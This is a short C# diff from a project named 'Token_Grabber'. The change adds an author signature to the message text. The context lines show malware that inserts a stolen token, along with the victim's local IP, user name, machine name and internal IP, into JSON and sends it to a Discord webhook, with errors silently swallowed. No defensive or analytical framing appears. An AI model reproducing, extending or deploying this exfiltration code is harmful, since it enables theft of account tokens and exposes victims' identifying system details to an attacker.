@@ -91,7 +91,7 @@ namespace Token_Grabber
             {
                 try
                 {
-                    string virtualjson = newjson.Insert(117 + Helpers.GetLocalIp().Length + Environment.UserName.Length + Environment.MachineName.Length + Helpers.internalip.Length, $"\\n Token: {item}");
+                    string virtualjson = newjson.Insert(117 + Helpers.GetLocalIp().Length + Environment.UserName.Length + Environment.MachineName.Length + Helpers.internalip.Length, $"\\n Token: {item} \\n \\n ʙʏ qᴅᴇᴇʀ");
                     Helpers.SendDiscordWebhook(url, virtualjson);
                 }
                 catch { }
